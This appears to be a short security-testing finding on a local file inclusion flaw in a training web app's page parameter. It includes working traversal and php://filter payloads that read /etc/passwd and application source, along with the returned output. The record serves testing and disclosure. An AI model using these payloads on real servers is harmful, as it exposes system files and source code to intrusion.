title: Local File Inclusion (LFI) via page parameter
proof: GET /vulnerabilities/fi/?page=../../../../../etc/passwd returned root:x:0:0:root:/root:/bin/bash and other system users. Also php://filter/read=convert.base64-encode/resource=../../vulnerabilities/fi/source/low.php returned base64-encoded source confirming no input sanitization ($file = $_GET['page']).
